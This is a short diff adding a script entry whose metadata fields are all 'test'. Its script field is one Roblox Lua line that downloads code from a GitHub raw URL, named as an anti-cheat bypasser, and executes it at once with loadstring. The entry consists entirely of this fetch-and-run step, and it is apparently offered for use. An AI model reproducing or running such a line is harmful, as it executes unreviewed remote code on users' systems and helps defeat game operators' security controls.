@@ -1,1 +1,5 @@
-
+name = "test"
+description = "test"
+creator = "test"
+picture = "" 
+script = "loadstring(game:HttpGet("https://raw.githubusercontent.com/adamowaissi22-boop/Axom/refs/heads/main/AntiCheat%20Bypasser%20by%20axom%20script"))()
